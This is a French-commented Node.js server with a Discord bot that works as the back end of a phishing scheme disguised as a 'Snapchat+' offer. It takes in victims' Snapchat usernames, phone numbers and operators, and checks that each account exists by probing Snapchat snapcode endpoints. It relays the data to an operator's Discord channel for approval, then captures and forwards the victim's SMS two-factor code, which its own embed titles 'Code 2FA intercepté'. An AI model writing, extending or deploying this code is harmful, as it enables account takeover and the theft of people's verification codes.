require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

// --- Configuration Express ---
const app = express();
app.use(express.json());
app.use(express.static('public'));

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

// Map pour stocker les demandes en attente
const requests = new Map();

const APPROVAL_CHANNEL_ID = process.env.DISCORD_APPROVAL_CHANNEL;
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT = process.env.PORT || 3000;

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    const id = uuidv4();
    requests.set(id, {
        snapchat, phone, operator,
        approved: false, rejected: false, code: null
    });

    try {
        const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
        if (!channel) throw new Error("Salon d'approbation introuvable");

        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande Snapchat+')
            .setColor(0xFFFC00)
            .addFields(
                { name: '👤 Pseudo', value: snapchat, inline: true },
                { name: '📱 Téléphone', value: phone, inline: true },
                { name: '📡 Opérateur', value: operator, inline: true }
            )
            .setFooter({ text: `ID: ${id}` })
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
            );

        // Message texte séparé avec blocs de code → bouton copier visible sur mobile
        const copyMsg = `👤 Pseudo\n\`\`\`${snapchat}\`\`\`📱 Téléphone\n\`\`\`${phone}\`\`\`📡 Opérateur\n\`\`\`${operator}\`\`\``;

        await channel.send({ embeds: [embed], components: [row] });
        await channel.send(copyMsg);
        console.log(`✅ Demande #${id} envoyée à Discord`);
        res.json({ id });
    } catch (err) {
        console.error('Erreur envoi Discord :', err);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 2. Vérification pseudo Snapchat
app.get('/api/check-snapchat/:username', async (req, res) => {
    const username = req.params.username.trim().toLowerCase();

    // Validation format Snapchat : 3-15 chars
    if (!username || username.length < 3 || username.length > 15) {
        return res.json({ exists: false, reason: 'format' });
    }
    if (!/^[a-z0-9][a-z0-9._-]{1,13}[a-z0-9]$/.test(username) && username.length > 2) {
        return res.json({ exists: false, reason: 'format' });
    }

    // On essaie plusieurs endpoints dans l'ordre
    const endpoints = [
        `https://feelinsonice-hrd.appspot.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=500`,
        `https://app.snapchat.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=240`,
    ];

    // Taille du ghost générique (pseudo inexistant) mesurée empiriquement ~2-3KB
    // Un vrai snapcode (même sans bitmoji) = unique QR dots = ~5KB+
    // Avec bitmoji = 15-50KB
    const REAL_USER_MIN_SIZE = 4500; // 4.5 KB minimum pour un vrai compte

    for (const url of endpoints) {
        try {
            const response = await axios.get(url, {
                responseType: 'arraybuffer',
                timeout: 6000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
                    'Accept': 'image/png,image/*,*/*;q=0.8',
                    'Referer': 'https://www.snapchat.com/'
                },
                validateStatus: () => true
            });

            const size = response.data ? response.data.byteLength : 0;
            console.log(`[SnapCheck] ${username} via ${new URL(url).hostname}: HTTP ${response.status}, ${size}B`);

            if (response.status === 404) {
                return res.json({ exists: false });
            }

            if (response.status === 200 && size >= REAL_USER_MIN_SIZE) {
                // Vrai utilisateur — on sert le snapcode comme avatar
                return res.json({
                    exists: true,
                    username,
                    displayName: username,
                    avatarUrl: url
                });
            }

            if (response.status === 200 && size > 0 && size < REAL_USER_MIN_SIZE) {
                // Image trop petite = ghost générique = pseudo inexistant
                return res.json({ exists: false });
            }

            // Autre statut (403, 5xx...) → essayer l'endpoint suivant
        } catch (err) {
            console.error(`[SnapCheck] Erreur ${new URL(url).hostname}:`, err.message);
            // Continuer avec l'endpoint suivant
        }
    }

    // Tous les endpoints ont échoué
    console.warn(`[SnapCheck] Tous les endpoints ont échoué pour: ${username}`);
    res.json({ exists: false, error: 'indisponible' });
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved: request.approved,
        rejected: request.rejected,
        snapchat: request.snapchat
    });
});

// 4. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!id || !code) return res.status(400).json({ error: 'Champs manquants' });
    const request = requests.get(id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    if (!request.approved) return res.status(403).json({ error: 'Demande non approuvée' });

    request.code = code;

    const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
    if (channel) {
        const embed = new EmbedBuilder()
            .setTitle('🔐 Code 2FA intercepté')
            .setColor(0x00FF00)
            .addFields(
                { name: '👤 Pseudo', value: request.snapchat, inline: true },
                { name: '📱 Téléphone', value: request.phone, inline: true },
                { name: '📡 Opérateur', value: request.operator, inline: true }
            )
            .setTimestamp();

        const copyMsg = `👤 Pseudo\n\`\`\`${request.snapchat}\`\`\`📱 Téléphone\n\`\`\`${request.phone}\`\`\`📡 Opérateur\n\`\`\`${request.operator}\`\`\`🔑 Code SMS\n\`\`\`${code}\`\`\``;

        channel.send({ embeds: [embed] });
        channel.send(copyMsg);
    }
    requests.delete(id);
    res.json({ success: true });
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const [action, requestId] = interaction.customId.split('_');
    if (action !== 'approve' && action !== 'reject') return;
    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable.', ephemeral: true });
    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }
    if (action === 'approve') {
        request.approved = true;
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
    } else {
        request.rejected = true;
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
    }
    await interaction.message.edit({ components: [] });
});

// --- Démarrage ---
client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
